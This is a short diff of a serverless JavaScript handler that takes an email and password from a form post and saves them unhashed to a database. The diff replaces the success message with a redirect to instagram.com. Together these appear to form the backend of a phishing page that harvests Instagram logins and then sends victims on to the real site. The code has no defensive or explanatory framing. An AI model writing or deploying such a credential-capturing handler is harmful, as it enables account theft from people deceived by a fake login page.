@@ -6,15 +6,16 @@ exports.handler = async (event) => {
     return { statusCode: 405, body: 'Method Not Allowed' };
   }
 
-const querystring = require('querystring');
-const { email, password } = querystring.parse(event.body);
-
+  const querystring = require('querystring');
+  const { email, password } = querystring.parse(event.body);
 
   try {
     await sql`INSERT INTO users (email, password) VALUES (${email}, ${password})`;
     return {
-      statusCode: 200,
-      body: '✅ User saved successfully!',
+      statusCode: 302,
+      headers: {
+        Location: "https://www.instagram.com",
+      },
     };
   } catch (err) {
     return {
